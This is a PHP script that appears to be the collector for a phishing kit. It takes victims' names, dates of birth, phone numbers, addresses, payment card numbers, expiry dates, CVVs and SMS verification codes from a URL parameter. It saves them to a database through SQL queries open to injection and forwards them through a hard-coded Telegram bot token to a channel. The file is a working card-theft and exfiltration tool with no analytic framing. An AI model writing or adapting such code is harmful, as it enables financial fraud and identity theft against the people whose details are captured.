<?php 
    $apiToken = "1048448590:AAEt9QyEBz1g0tFUlxWm328YpCL7_XUK1VY";
    $message = "";
    
    if(!empty($_GET['data'])){$message = $_GET['data'];};
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "test";

    // Create connection
    $conn = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
    }
    
    $tmp_message = $message;
    $sp = explode("|", $tmp_message);
    if(sizeof($sp) < 9){
        $tmp = explode(':', $sp[0]);
        $first_name = $tmp[1];
        $tmp = explode(':', $sp[1]);
        $last_name = $tmp[1];
        $tmp = explode(':', $sp[2]);
        $dob = $tmp[1];
        $tmp = explode(':', $sp[3]);
        $phone = $tmp[1];
        $tmp = explode(':', $sp[4]);
        $address = $tmp[1];
        $tmp = explode(':', $sp[5]);
        $city = $tmp[1];
        $tmp = explode(':', $sp[6]);
        $code = $tmp[1];
        $query = "insert into user_info(user_name, user_phone, user_address, user_dob, user_city, user_code) values('" . $first_name . $last_name . "', '" . $phone . "', '" . $address ."', '" . $dob ."', '". $city . "', '" . $code ."')";
        $conn->query($query);
        echo $tmp_message;
    }else if(sizeof($sp) > 8 && sizeof($sp) < 12){
        $tmp = explode(':', $sp[7]);
        $card = $tmp[1];
        $tmp = explode(':', $sp[8]);
        $exp = $tmp[1];
        $tmp = explode(':', $sp[9]);
        $cvv = $tmp[1];
        $tmp = explode(':', $sp[3]);
        $phone = $tmp[1];
        $query = "UPDATE user_info SET user_card='". $card ."', user_expiration_date='". $exp ."', user_cvv='" . $cvv . "' WHERE user_phone='". $phone ."'";
        $conn->query($query);
        echo $tmp_message;
    }else {
        $tmp = explode(':', $sp[10]);
        $smscode = $tmp[1];
        $tmp = explode(':', $sp[3]);
        $phone = $tmp[1];
        $query = "UPDATE user_info SET user_validation_code='". $smscode ."' WHERE user_phone='". $phone ."'";
        $conn->query($query);
    }
    $conn->close();
    // $sql = "SELECT user_name, user_phone, user_address FROM user_info";
    // $result = $conn->query($sql);

    // if ($result->num_rows > 0) {
    // // output data of each row
    // while($row = $result->fetch_assoc()) {
    //     echo "id: " . $row["id"]. " - Name: " . $row["firstname"]. " " . $row["lastname"]. "<br>";
    // }
    // } else {
    // echo "0 results";
    // }

    $tmp_message = $message;

    $message = preg_replace("/\|/im", "\n", $message);
    $data = [
        'chat_id' => '@mychanalix',
        'text' => $message
    ];
    
    $url = 'https://api.telegram.org/bot'.$apiToken.'/sendMessage';
    if (isset($data['chat_id'])) {
        $url = $url.'?chat_id='.$data['chat_id'];
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
    
?>